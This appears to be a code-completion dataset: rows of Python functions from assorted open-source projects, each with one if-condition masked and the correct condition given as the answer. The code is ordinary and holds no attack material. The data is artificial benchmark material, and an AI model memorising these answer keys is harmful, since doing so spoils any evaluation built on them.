2815,"def _1_0_cloud_ips_cip_jsjc5(self, method, url, body, headers):<tab>if method == ""DELETE"":<tab><tab>return self.test_response(httplib.OK, """")<tab>elif method == ""PUT"":<tab><tab>body = json.loads(body)<tab><tab><IF-STMT><tab><tab><tab>return self.test_response(httplib.OK, """")<tab><tab>else:<tab><tab><tab>return self.test_response(<tab><tab><tab><tab>httplib.BAD_REQUEST, '{""error_name"":""bad dns"", ""errors"": [""Bad dns""]}'<tab><tab><tab>)","if body . get ( ""reverse_dns"" , None ) == ""fred.co.uk"" :",160
2816,"def _print_one_entry(news_entry: xml.etree.ElementTree.Element) -> None:<tab>child: xml.etree.ElementTree.Element<tab>for child in news_entry:<tab><tab>if ""title"" in child.tag:<tab><tab><tab>title = str(child.text)<tab><tab><IF-STMT><tab><tab><tab>pub_date = str(child.text)<tab><tab>if ""description"" in child.tag:<tab><tab><tab>description = str(child.text)<tab>print_stdout(color_line(title, 14) + "" ("" + bold_line(pub_date) + "")"")<tab>print_stdout(format_paragraph(strip_tags(description)))<tab>print_stdout()","if ""pubDate"" in child . tag :",169
2817,"def oregon_battery(self, offset):<tab>nib = self.decoded_nibbles<tab>batt = ""OK""<tab>if nib[offset][3] != """":<tab><tab><IF-STMT><tab><tab><tab>batt = ""Low""<tab><tab>self.put(<tab><tab><tab>nib[offset][0], nib[offset][1], self.out_ann, [2, [""Batt "" + batt, batt]]<tab><tab>)","if ( int ( nib [ offset ] [ 3 ] , 16 ) >> 2 ) & 0x1 == 1 :",128
2818,"def body_stream() -> typing.AsyncGenerator[bytes, None]:<tab>while True:<tab><tab>message = await queue.get()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>assert message[""type""] == ""http.response.body""<tab><tab>yield message.get(""body"", b"""")<tab>task.result()",if message is None :,77
2819,"def _wait_for_reboot():<tab>try:<tab><tab>state = self._conn.reboot_domain(instance[""name""])<tab><tab><IF-STMT><tab><tab><tab>LOG.debug(_(""instance %s: rebooted""), instance[""name""])<tab><tab><tab>timer.stop()<tab>except Exception:<tab><tab>LOG.exception(_(""_wait_for_reboot failed""))<tab><tab>timer.stop()",if state == power_state . RUNNING :,97
2820,"def _get_sequence_vector(<tab>sequence,<tab>tokenizer,<tab>format_dtype,<tab>unit_to_id,<tab>lowercase=True,<tab>unknown_symbol=UNKNOWN_SYMBOL,):<tab>unit_sequence = tokenizer(sequence.lower() if lowercase else sequence)<tab>unit_indices_vector = np.empty(len(unit_sequence), dtype=format_dtype)<tab>for i in range(len(unit_sequence)):<tab><tab>curr_unit = unit_sequence[i]<tab><tab><IF-STMT><tab><tab><tab>unit_indices_vector[i] = unit_to_id[curr_unit]<tab><tab>else:<tab><tab><tab>unit_indices_vector[i] = unit_to_id[unknown_symbol]<tab>return unit_indices_vector",if curr_unit in unit_to_id :,188
2821,"def forward(self, x: Tensor, edge_index: Adj) -> Tensor:<tab>""""""""""""<tab>if self.add_self_loops:<tab><tab>if isinstance(edge_index, Tensor):<tab><tab><tab>edge_index, _ = remove_self_loops(edge_index)<tab><tab><tab>edge_index, _ = add_self_loops(edge_index, num_nodes=x.size(self.node_dim))<tab><tab><IF-STMT><tab><tab><tab>edge_index = set_diag(edge_index)<tab>x_norm = F.normalize(x, p=2.0, dim=-1)<tab># propagate_type: (x: Tensor, x_norm: Tensor)<tab>return self.propagate(edge_index, x=x, x_norm=x_norm, size=None)","elif isinstance ( edge_index , SparseTensor ) :",196
2822,"def _init_req_settings(self, **kwargs):<tab>for req_attr in self._req_settings:<tab><tab>req_attr_value = kwargs.get(req_attr)<tab><tab><IF-STMT><tab><tab><tab>raise MissingRequiredConf(conf_name=req_attr_value)<tab><tab># Validate attribute value<tab><tab>req_attr_value = get_validator(req_attr)(req_attr_value)<tab><tab>self._settings[req_attr] = req_attr_value",if req_attr_value is None :,122
2823,"def delete(identifier, filenames=None, **kwargs):<tab>item = get_item(identifier)<tab>if filenames:<tab><tab>if not isinstance(filenames, (set, list)):<tab><tab><tab>filenames = [filenames]<tab><tab>for f in item.iter_files():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>f.delete(**kwargs)",if f . name not in filenames :,91
2824,"def visit_decorator(self, o: Decorator) -> None:<tab>if self.is_private_name(o.func.name, o.func.fullname):<tab><tab>return<tab>is_abstract = False<tab>for decorator in o.original_decorators:<tab><tab>if isinstance(decorator, NameExpr):<tab><tab><tab>if self.process_name_expr_decorator(decorator, o):<tab><tab><tab><tab>is_abstract = True<tab><tab>elif isinstance(decorator, MemberExpr):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>is_abstract = True<tab>self.visit_func_def(o.func, is_abstract=is_abstract)","if self . process_member_expr_decorator ( decorator , o ) :",160
2825,"def split_trading_pair(trading_pair: str) -> Optional[Tuple[str, str]]:<tab>try:<tab><tab>m = RE_4_LETTERS_QUOTE.match(trading_pair)<tab><tab><IF-STMT><tab><tab><tab>m = RE_3_LETTERS_QUOTE.match(trading_pair)<tab><tab><tab>if m is None:<tab><tab><tab><tab>m = RE_2_LETTERS_QUOTE.match(trading_pair)<tab><tab>return m.group(1), m.group(2)<tab># Exceptions are now logged as warnings in trading pair fetcher<tab>except Exception:<tab><tab>return None",if m is None :,156
2826,"def traverse_states(root):<tab>todo = [root]<tab>model = self.model<tab>while len(todo):<tab><tab>iter = todo.pop(0)<tab><tab># print model.value_path(iter, treeindex), model.get_state(iter, treeindex)<tab><tab>yield model.get_state(iter, treeindex)<tab><tab>path = model.get_path(iter)<tab><tab><IF-STMT><tab><tab><tab>children = []<tab><tab><tab>child = model.iter_children(iter)<tab><tab><tab>while child:<tab><tab><tab><tab>children.append(child)<tab><tab><tab><tab>child = model.iter_next(child)<tab><tab><tab>todo = children + todo<tab>yield None  # end marker",if treeview . row_expanded ( path ) :,178
2827,"def as_list(<tab>self, compact=True, storage_to_dict=True, datetime_to_str=False, custom_types=None):<tab>if storage_to_dict:<tab><tab>items = []<tab><tab>for row in self:<tab><tab><tab>item = row.as_dict(datetime_to_str, custom_types)<tab><tab><tab>for jdata in self._joins_:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>item[jdata[0]] = row[jdata[0]].as_list()<tab><tab><tab>items.append(item)<tab>else:<tab><tab>items = [item for item in self]<tab>return items",if not jdata [ 2 ] :,160
2828,"def zip(target, source, env):<tab>compression = env.get(""ZIPCOMPRESSION"", 0)<tab>zf = zipfile.ZipFile(str(target[0]), ""w"", compression)<tab>for s in source:<tab><tab>if s.isdir():<tab><tab><tab>for dirpath, dirnames, filenames in os.walk(str(s)):<tab><tab><tab><tab>for fname in filenames:<tab><tab><tab><tab><tab>path = os.path.join(dirpath, fname)<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>zf.write(path)<tab><tab>else:<tab><tab><tab>zf.write(str(s))<tab>zf.close()",if os . path . isfile ( path ) :,155
2829,def remove_PBA_files():<tab>if monkey_island.cc.services.config.ConfigService.get_config():<tab><tab>windows_filename = (<tab><tab><tab>monkey_island.cc.services.config.ConfigService.get_config_value(<tab><tab><tab><tab>PBA_WINDOWS_FILENAME_PATH<tab><tab><tab>)<tab><tab>)<tab><tab>linux_filename = (<tab><tab><tab>monkey_island.cc.services.config.ConfigService.get_config_value(<tab><tab><tab><tab>PBA_LINUX_FILENAME_PATH<tab><tab><tab>)<tab><tab>)<tab><tab>if linux_filename:<tab><tab><tab>remove_file(linux_filename)<tab><tab><IF-STMT><tab><tab><tab>remove_file(windows_filename),if windows_filename :,183
2830,"def test_takewhile(self):<tab>for s in (range(10), range(0), range(1000), (7, 11), range(2000, 2200, 5)):<tab><tab>for g in (G, I, Ig, S, L, R):<tab><tab><tab>tgt = []<tab><tab><tab>for elem in g(s):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab><tab><tab>tgt.append(elem)<tab><tab><tab>self.assertEqual(list(takewhile(isEven, g(s))), tgt)<tab><tab>self.assertRaises(TypeError, takewhile, isEven, X(s))<tab><tab>self.assertRaises(TypeError, takewhile, isEven, N(s))<tab><tab>self.assertRaises(ZeroDivisionError, list, takewhile(isEven, E(s)))",if not isEven ( elem ) :,188
2831,"def find_defined_variables(board_config_mks):<tab>re_def = re.compile(""^[\s]*([\w\d_]*)[\s]*:="")<tab>variables = dict()<tab>for board_config_mk in board_config_mks:<tab><tab>for line in open(board_config_mk, encoding=""latin1""):<tab><tab><tab>mo = re_def.search(line)<tab><tab><tab>if mo is None:<tab><tab><tab><tab>continue<tab><tab><tab>variable = mo.group(1)<tab><tab><tab>if variable in white_list:<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>variables[variable] = set()<tab><tab><tab>variables[variable].add(board_config_mk[len(TOP) + 1 :])<tab>return variables",if variable not in variables :,188
2832,"def download_file(url, file):<tab>try:<tab><tab>xlog.info(""download %s to %s"", url, file)<tab><tab>opener = get_opener()<tab><tab>req = opener.open(url, cafile="""")<tab><tab>CHUNK = 16 * 1024<tab><tab>with open(file, ""wb"") as fp:<tab><tab><tab>while True:<tab><tab><tab><tab>chunk = req.read(CHUNK)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab><tab><tab>fp.write(chunk)<tab><tab>return True<tab>except:<tab><tab>xlog.info(""download %s to %s fail"", url, file)<tab><tab>return False",if not chunk :,158
2833,"def set_preferred_lane(self, preferred_lane: int = None) -> ""AbstractEnv"":<tab>env_copy = copy.deepcopy(self)<tab>if preferred_lane:<tab><tab>for v in env_copy.road.vehicles:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>v.route = [(lane[0], lane[1], preferred_lane) for lane in v.route]<tab><tab><tab><tab># Vehicle with lane preference are also less cautious<tab><tab><tab><tab>v.LANE_CHANGE_MAX_BRAKING_IMPOSED = 1000<tab>return env_copy","if isinstance ( v , IDMVehicle ) :",152
2834,"def resolve(self, value: Optional[T]) -> T:<tab>v: Optional[Any] = value<tab>if value is None:<tab><tab>t = os.environ.get(self.envvar)<tab><tab>if self.type is bool and t:<tab><tab><tab>v = t in [""true"", ""True"", ""1"", ""yes""]<tab><tab><IF-STMT><tab><tab><tab>v = t<tab><tab>elif t:<tab><tab><tab>v = ast.literal_eval(t) if t is not None else None<tab>if v is None:<tab><tab>v = self.default<tab>return v",elif self . type is str and t :,144
2835,"def test_read_lazy_A(self):<tab>want = [""x"" * 100, EOF_sigil]<tab>self.dataq.put(want)<tab>telnet = telnetlib.Telnet(HOST, self.port)<tab>self.dataq.join()<tab>time.sleep(self.block_short)<tab>self.assertEqual("""", telnet.read_lazy())<tab>data = """"<tab>while True:<tab><tab>try:<tab><tab><tab>read_data = telnet.read_lazy()<tab><tab><tab>data += read_data<tab><tab><tab><IF-STMT><tab><tab><tab><tab>telnet.fill_rawq()<tab><tab>except EOFError:<tab><tab><tab>break<tab><tab>self.assertTrue(want[0].startswith(data))<tab>self.assertEqual(data, want[0])",if not read_data :,192
2836,"def request_put_json(url, headers):<tab>""""""Makes a PUT request and returns the JSON response""""""<tab>try:<tab><tab>response = requests.put(url, headers=headers)<tab><tab><IF-STMT><tab><tab><tab>return response.json()<tab><tab>else:<tab><tab><tab>raise RadarrRequestError(<tab><tab><tab><tab>""Invalid response received from Radarr: %s"" % response.content<tab><tab><tab>)<tab>except RequestException as e:<tab><tab>raise RadarrRequestError(<tab><tab><tab>""Unable to connect to Radarr at %s. Error: %s"" % (url, e)<tab><tab>)",if response . status_code == 200 :,150
2837,"def firebase_analysis(urls):<tab># Detect Firebase URL<tab>firebase_db = []<tab>logger.info(""Detecting Firebase URL(s)"")<tab>for url in urls:<tab><tab><IF-STMT><tab><tab><tab>returl, is_open = open_firebase(url)<tab><tab><tab>fbdic = {""url"": returl, ""open"": is_open}<tab><tab><tab>if fbdic not in firebase_db:<tab><tab><tab><tab>firebase_db.append(fbdic)<tab>return firebase_db","if ""firebaseio.com"" in url :",135
2838,"def logprob(self, sample):<tab>if self._log:<tab><tab>return self._prob_dict.get(sample, _NINF)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>return _NINF<tab><tab>elif self._prob_dict[sample] == 0:<tab><tab><tab>return _NINF<tab><tab>else:<tab><tab><tab>return math.log(self._prob_dict[sample], 2)",if sample not in self . _prob_dict :,102
2839,"def is_image(self, input):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>elif isinstance(input, str):<tab><tab><tab>if not os.path.isfile(input):<tab><tab><tab><tab>raise ValueError(""input must be a file"")<tab><tab><tab>img = Image.open(input)<tab><tab><tab>_ = img.size<tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>return False<tab>except:<tab><tab>return False","if isinstance ( input , ( np . ndarray , Image . Image ) ) :",122
2840,"def extract(self):<tab>for battery in self.vars:<tab><tab>for line in dopen(""/proc/acpi/battery/"" + battery + ""/state"").readlines():<tab><tab><tab>l = line.split()<tab><tab><tab>if len(l) < 3:<tab><tab><tab><tab>continue<tab><tab><tab>if l[0:2] == [""remaining"", ""capacity:""]:<tab><tab><tab><tab>remaining = int(l[2])<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>rate = int(l[2])<tab><tab><tab><tab>continue<tab><tab>if rate and remaining:<tab><tab><tab>self.val[battery] = remaining * 60 / rate<tab><tab>else:<tab><tab><tab>self.val[battery] = -1","elif l [ 0 : 2 ] == [ ""present"" , ""rate:"" ] :",185
2841,"def get_app_module(module_name, raise_on_failure=True):<tab>try:<tab><tab>__import__(module_name)<tab>except ImportError:<tab><tab>if sys.exc_info()[-1].tb_next:<tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>f""While importing '{module_name}', an ImportError was raised:""<tab><tab><tab><tab>f""\n\n{traceback.format_exc()}""<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(f""Could not import '{module_name}'."")<tab><tab>else:<tab><tab><tab>return<tab>return sys.modules[module_name]",elif raise_on_failure :,152
2842,"def process_shutdown_hooks(self):<tab>for plugin_name in self.DISCOVERED.keys():<tab><tab>try:<tab><tab><tab>package = ""mailpile.plugins.%s"" % plugin_name<tab><tab><tab>_, manifest = self.DISCOVERED[plugin_name]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for method_name in self._mf_path(manifest, ""lifecycle"", ""shutdown""):<tab><tab><tab><tab><tab>method = self._get_method(package, method_name)<tab><tab><tab><tab><tab>method(self.config)<tab><tab>except:<tab><tab><tab># ignore exceptions here as mailpile is going to shut down<tab><tab><tab>traceback.print_exc(file=sys.stderr)",if package in sys . modules :,175
2843,"def _check_arch(self, arch):<tab>if arch is None:<tab><tab>return<tab>try:<tab><tab>from pycuda.driver import Context<tab><tab>capability = Context.get_device().compute_capability()<tab><tab><IF-STMT><tab><tab><tab>from warnings import warn<tab><tab><tab>warn(<tab><tab><tab><tab>""trying to compile for a compute capability "" ""higher than selected GPU""<tab><tab><tab>)<tab>except Exception:<tab><tab>pass","if tuple ( map ( int , tuple ( arch . split ( ""_"" ) [ 1 ] ) ) ) > capability :",122
2844,"def phpinfo_ext(content):<tab>indexes = SubstrFind(content, ""AbracadabrA"")<tab>found = len(indexes) > 0<tab>got = """"<tab>if found:<tab><tab>start = indexes[0] + 11<tab><tab>for x in range(start, len(content)):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>got += content[x]<tab>return got","if content [ x ] == ""<"" :",103
2845,"def update_leaderboard(wait_time):<tab>conn = get_connection()<tab>cursor = conn.cursor(MySQLdb.cursors.DictCursor)<tab>while True:<tab><tab>try:<tab><tab><tab>if use_log:<tab><tab><tab><tab>log.info(""Updating leaderboard and adding some sigma"")<tab><tab><tab>cursor.execute(""call generate_leaderboard;"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>for s in range(wait_time):<tab><tab><tab><tab># allow for a [Ctrl]+C during the sleep cycle<tab><tab><tab><tab>time.sleep(1)<tab><tab>except KeyboardInterrupt:<tab><tab><tab>break<tab><tab>except:<tab><tab><tab># log error<tab><tab><tab>log.error(traceback.format_exc())<tab><tab><tab>break<tab>cursor.close()<tab>conn.close()",if wait_time == 0 :,199
2846,"def writeBit(self, state, endian):<tab>if self._bit_pos == 7:<tab><tab>self._bit_pos = 0<tab><tab><IF-STMT><tab><tab><tab>if endian is BIG_ENDIAN:<tab><tab><tab><tab>self._byte |= 1<tab><tab><tab>else:<tab><tab><tab><tab>self._byte |= 128<tab><tab>self._output.write(chr(self._byte))<tab><tab>self._byte = 0<tab>else:<tab><tab>if state:<tab><tab><tab>if endian is BIG_ENDIAN:<tab><tab><tab><tab>self._byte |= 1 << self._bit_pos<tab><tab><tab>else:<tab><tab><tab><tab>self._byte |= 1 << (7 - self._bit_pos)<tab><tab>self._bit_pos += 1",if state :,177
2847,"def getreportopt(config):<tab>reportopts = """"<tab>reportchars = config.option.reportchars<tab>if not config.option.disablepytestwarnings and ""w"" not in reportchars:<tab><tab>reportchars += ""w""<tab>elif config.option.disablepytestwarnings and ""w"" in reportchars:<tab><tab>reportchars = reportchars.replace(""w"", """")<tab>if reportchars:<tab><tab>for char in reportchars:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>reportopts += char<tab><tab><tab>elif char == ""a"":<tab><tab><tab><tab>reportopts = ""fEsxXw""<tab>return reportopts","if char not in reportopts and char != ""a"" :",157
2848,"def validate_module(self, pipeline):<tab>if self.mode == MODE_UNTANGLE:<tab><tab><IF-STMT><tab><tab><tab>path = os.path.join(<tab><tab><tab><tab>self.training_set_directory.get_absolute_path(),<tab><tab><tab><tab>self.training_set_file_name.value,<tab><tab><tab>)<tab><tab><tab>if not os.path.exists(path):<tab><tab><tab><tab>raise ValidationError(<tab><tab><tab><tab><tab>""Can't find file %s"" % self.training_set_file_name.value,<tab><tab><tab><tab><tab>self.training_set_file_name,<tab><tab><tab><tab>)",if self . training_set_directory . dir_choice != URL_FOLDER_NAME :,170
2849,"def reshape(w, h):<tab>try:<tab><tab># Prevent a division by zero when minimising the window<tab><tab><IF-STMT><tab><tab><tab>h = 1<tab><tab># Set the drawable region of the window<tab><tab>glViewport(0, 0, w, h)<tab><tab># set up the projection matrix<tab><tab>glMatrixMode(GL_PROJECTION)<tab><tab>glLoadIdentity()<tab><tab># go back to modelview matrix so we can move the objects about<tab><tab>glMatrixMode(GL_MODELVIEW)<tab><tab>updatePickingBuffer()<tab>except Exception:<tab><tab>log.error(""gl.reshape"", exc_info=True)",if h == 0 :,157
2850,"def __setitem__(self, key, value):<tab>if not isinstance(value, PseudoNamespace):<tab><tab>tuple_converted = False<tab><tab><IF-STMT><tab><tab><tab>value = PseudoNamespace(value)<tab><tab>elif isinstance(value, tuple):<tab><tab><tab>value = list(value)<tab><tab><tab>tuple_converted = True<tab><tab>if isinstance(value, list):<tab><tab><tab>for i, item in enumerate(value):<tab><tab><tab><tab>if isinstance(item, dict) and not isinstance(item, PseudoNamespace):<tab><tab><tab><tab><tab>value[i] = PseudoNamespace(item)<tab><tab><tab>if tuple_converted:<tab><tab><tab><tab>value = tuple(value)<tab>super(PseudoNamespace, self).__setitem__(key, value)","if isinstance ( value , dict ) :",175
2851,"def scan_search(state):<tab>delim = state.source[state.position - 1]<tab>while True:<tab><tab>c = state.consume()<tab><tab>if c == delim:<tab><tab><tab>state.start += 1<tab><tab><tab>state.backup()<tab><tab><tab>content = state.emit()<tab><tab><tab>state.consume()<tab><tab><tab>token = TokenSearchForward if c == ""/"" else TokenSearchBackward<tab><tab><tab>return scan_range, [token(content)]<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""unclosed search pattern: {0}"".format(state.source))",elif c == EOF :,141
2852,"def fromVariant(variant):<tab>if hasattr(QtCore, ""QVariant"") and isinstance(variant, QtCore.QVariant):<tab><tab>t = variant.type()<tab><tab>if t == QtCore.QVariant.String:<tab><tab><tab>return str(variant.toString())<tab><tab>elif t == QtCore.QVariant.Double:<tab><tab><tab>return variant.toDouble()[0]<tab><tab>elif t == QtCore.QVariant.Int:<tab><tab><tab>return variant.toInt()[0]<tab><tab>elif t == QtCore.QVariant.Bool:<tab><tab><tab>return variant.toBool()<tab><tab><IF-STMT><tab><tab><tab>return None<tab><tab>else:<tab><tab><tab>raise ValueError('Unsupported QVariant type ""%s""' % variant.typeName())<tab>else:<tab><tab>return variant",elif t == QtCore . QVariant . Invalid :,195
2853,"def __iter__(self):<tab>i = 0<tab>for category, filename in list(self.input_files.items()):<tab><tab>for line in open(filename):<tab><tab><tab>line = self._clean_line(line)<tab><tab><tab>if self.accept_criteria(i):<tab><tab><tab><tab>yield Opinion(line, category)<tab><tab><tab>i += 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(""\tReaded {} examples"".format(i))",if i % 1000 == 0 :,115
2854,"def test_listing_all_frameworks_and_check_frameworks_by_order(self):<tab>""""""List all frameworks and check if frameworks appear by order""""""<tab>result = subprocess.check_output(self.command_as_list([UMAKE, ""--list""]))<tab>previous_framework = None<tab>for element in result.split(b""\n""):<tab><tab><IF-STMT><tab><tab><tab>current_framework = element[: element.find(b"":"")]<tab><tab><tab>if previous_framework:<tab><tab><tab><tab>self.assertTrue(previous_framework < current_framework)<tab><tab><tab>previous_framework = current_framework<tab><tab>else:<tab><tab><tab>previous_framework = None","if element . startswith ( b""\t"" ) :",160
2855,"def _locate_code(self, event):<tab>if self._current_code_view is None:<tab><tab>return<tab>iid = self.tree.focus()<tab>if iid != """":<tab><tab>values = self.tree.item(iid)[""values""]<tab><tab><IF-STMT><tab><tab><tab>start_line, start_col, end_line, end_col = values[1:5]<tab><tab><tab>self._current_code_view.select_range(<tab><tab><tab><tab>TextRange(start_line, start_col, end_line, end_col)<tab><tab><tab>)","if isinstance ( values , list ) and len ( values ) >= 5 :",150
2856,"def __setattr__(self, attr, value):<tab>""""""Provides additional checks on recipient fields.""""""<tab>if attr in [""to"", ""cc"", ""bcc""]:<tab><tab>if isinstance(value, basestring):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return<tab><tab><tab>check_email_valid(value, attr)<tab><tab>else:<tab><tab><tab>for address in value:<tab><tab><tab><tab>check_email_valid(address, attr)<tab>elif attr == ""headers"":<tab><tab>check_headers_valid(value)<tab>super(EmailMessage, self).__setattr__(attr, value)","if value == """" and getattr ( self , ""ALLOW_BLANK_EMAIL"" , False ) :",151
2857,"def _scanDirectory(self, dirIter, f):<tab>while len(f) < 250:<tab><tab>try:<tab><tab><tab>info = next(dirIter)<tab><tab>except StopIteration:<tab><tab><tab>if not f:<tab><tab><tab><tab>raise EOFError<tab><tab><tab>return f<tab><tab><IF-STMT><tab><tab><tab>info.addCallback(self._cbScanDirectory, dirIter, f)<tab><tab><tab>return<tab><tab>else:<tab><tab><tab>f.append(info)<tab>return f","if isinstance ( info , defer . Deferred ) :",122
2858,def iterator():<tab>try:<tab><tab>while True:<tab><tab><tab>yield from pullparser.read_events()<tab><tab><tab># load event buffer<tab><tab><tab>data = source.read(16 * 1024)<tab><tab><tab>if not data:<tab><tab><tab><tab>break<tab><tab><tab>pullparser.feed(data)<tab><tab>root = pullparser._close_and_return_root()<tab><tab>yield from pullparser.read_events()<tab><tab>it.root = root<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>source.close(),if close_source :,130
2859,"def test_until_timeout(self):<tab>timer = TestTimer(self.timeout)<tab>while not timer.is_timed_out():<tab><tab><IF-STMT><tab><tab><tab>self.log_success(timer)<tab><tab><tab>return<tab><tab>sleep(DELAY_BETWEEN_ANALYSIS)<tab><tab>LOGGER.debug(<tab><tab><tab>""Waiting until all analyzers passed. Time passed: {}"".format(<tab><tab><tab><tab>timer.get_time_taken()<tab><tab><tab>)<tab><tab>)<tab>self.log_failure(timer)<tab>assert False",if self . all_analyzers_pass ( ) :,139
2860,"def start(self):<tab>""""""Start our callback in its own perpetual timer thread.""""""<tab>if self.frequency > 0:<tab><tab>threadname = self.name or self.__class__.__name__<tab><tab><IF-STMT><tab><tab><tab>self.thread = PerpetualTimer(self.frequency, self.callback)<tab><tab><tab>self.thread.bus = self.bus<tab><tab><tab>self.thread.setName(threadname)<tab><tab><tab>self.thread.start()<tab><tab><tab>self.bus.log(""Started monitor thread %r."" % threadname)<tab><tab>else:<tab><tab><tab>self.bus.log(""Monitor thread %r already started."" % threadname)",if self . thread is None :,160
2861,"def set_flavour(flavour, request=None, permanent=False):<tab>if flavour not in settings.FLAVOURS:<tab><tab>raise ValueError(<tab><tab><tab>u""'%r' is no valid flavour. Allowed flavours are: %s""<tab><tab><tab>% (<tab><tab><tab><tab>flavour,<tab><tab><tab><tab>"", "".join(settings.FLAVOURS),<tab><tab><tab>)<tab><tab>)<tab>request = request or getattr(_local, ""request"", None)<tab>if request:<tab><tab>request.flavour = flavour<tab><tab><IF-STMT><tab><tab><tab>flavour_storage.set(request, flavour)<tab>elif permanent:<tab><tab>raise ValueError(u""Cannot set flavour permanently, no request available."")<tab>_local.flavour = flavour",if permanent :,176
2862,"def get_images(image_path, support_ext="".jpg|.jpeg|.png""):<tab>if not os.path.exists(image_path):<tab><tab>raise Exception(f""Image path {image_path} invalid"")<tab>if os.path.isfile(image_path):<tab><tab>return [image_path]<tab>imgs = []<tab>for item in os.listdir(image_path):<tab><tab>ext = os.path.splitext(item)[1][1:].strip().lower()<tab><tab><IF-STMT><tab><tab><tab>item_path = os.path.join(image_path, item)<tab><tab><tab>imgs.append(item_path)<tab>return imgs",if len ( ext ) > 0 and ext in support_ext :,167
2863,"def write_text(self, text):<tab>""""""Writes re-indented text into the buffer.""""""<tab>should_indent = False<tab>rows = []<tab>for row in text.split(""\n""):<tab><tab><IF-STMT><tab><tab><tab>row = ""<tab>{}"".format(row)<tab><tab>if ""\b"" in row:<tab><tab><tab>row = row.replace(""\b"", """", 1)<tab><tab><tab>should_indent = True<tab><tab>elif not len(row.strip()):<tab><tab><tab>should_indent = False<tab><tab>rows.append(row)<tab>self.write(""{}\n"".format(""\n"".join(rows)))",if should_indent :,147
2864,"def build_priorities(self, _iter, priorities):<tab>while _iter is not None:<tab><tab>if self.files_treestore.iter_has_child(_iter):<tab><tab><tab>self.build_priorities(self.files_treestore.iter_children(_iter), priorities)<tab><tab><IF-STMT><tab><tab><tab>priorities[<tab><tab><tab><tab>self.files_treestore.get_value(_iter, 3)<tab><tab><tab>] = self.files_treestore.get_value(_iter, 0)<tab><tab>_iter = self.files_treestore.iter_next(_iter)<tab>return priorities","elif not self . files_treestore . get_value ( _iter , 1 ) . endswith ( os . path . sep ) :",170
2865,"def _validate_sample(self, value):<tab>mask = self.support(value)<tab>if not_jax_tracer(mask):<tab><tab><IF-STMT><tab><tab><tab>warnings.warn(<tab><tab><tab><tab>""Out-of-support values provided to log prob method. ""<tab><tab><tab><tab>""The value argument should be within the support.""<tab><tab><tab>)<tab>return mask",if not np . all ( mask ) :,94
2866,"def https_open(self, req):<tab>try:<tab><tab>return self.do_open(do_connection, req)<tab>except Exception as err_msg:<tab><tab>try:<tab><tab><tab>error_msg = str(err_msg.args[0]).split(""] "")[1] + "".""<tab><tab>except IndexError:<tab><tab><tab>error_msg = str(err_msg.args[0]) + "".""<tab><tab>if settings.INIT_TEST == True:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(settings.FAIL_STATUS)<tab><tab>else:<tab><tab><tab>if settings.VERBOSITY_LEVEL < 1:<tab><tab><tab><tab>print("""")<tab><tab>print(settings.print_critical_msg(error_msg))<tab><tab>raise SystemExit()",if settings . VERBOSITY_LEVEL < 2 :,187
2867,"def add_party(self, party_type, party):<tab>party_doc = frappe.new_doc(party_type)<tab>if party_type == ""Customer"":<tab><tab>party_doc.customer_name = party<tab>else:<tab><tab>supplier_group = frappe.db.get_single_value(""Buying Settings"", ""supplier_group"")<tab><tab><IF-STMT><tab><tab><tab>frappe.throw(_(""Please Set Supplier Group in Buying Settings.""))<tab><tab>party_doc.supplier_name = party<tab><tab>party_doc.supplier_group = supplier_group<tab>party_doc.flags.ignore_mandatory = True<tab>party_doc.save(ignore_permissions=True)",if not supplier_group :,175
2868,"def get_polymorphic_model(data):<tab>for model in itervalues(models):<tab><tab>polymorphic = model.opts.polymorphic<tab><tab><IF-STMT><tab><tab><tab>polymorphic_key = polymorphic<tab><tab><tab>if isinstance(polymorphic_key, bool):<tab><tab><tab><tab>polymorphic_key = ""type""<tab><tab><tab>if data.get(polymorphic_key) == model.__name__:<tab><tab><tab><tab>return model<tab>raise ImproperlyConfigured(u""No model found for data: {!r}"".format(data))",if polymorphic :,133
2869,"def cleanup_expired_revoked_tokens():<tab>""""""Remove tokens that have now expired from the revoked token table.""""""<tab>revoked_tokens = db.session.query(RevokedToken).all()<tab>for revoked_token in revoked_tokens:<tab><tab><IF-STMT><tab><tab><tab>pass  # The token has not expired, we must keep in the revoked token table.<tab><tab>else:<tab><tab><tab># The token is no longer valid, remove from the revoked token table.<tab><tab><tab>db.session.delete(revoked_token)<tab>db.session.commit()",if Journalist . validate_token_is_not_expired_or_invalid ( revoked_token . token ) :,161
2870,"def matches_filter(key, values):<tab>if key == ""location"":<tab><tab>if location_type in (""availability-zone"", ""availability-zone-id""):<tab><tab><tab>return offering.get(""Location"") in values<tab><tab><IF-STMT><tab><tab><tab>return any(v for v in values if offering.get(""Location"").startswith(v))<tab><tab>else:<tab><tab><tab>return False<tab>elif key == ""instance-type"":<tab><tab>return offering.get(""InstanceType"") in values<tab>else:<tab><tab>return False","elif location_type == ""region"" :",130
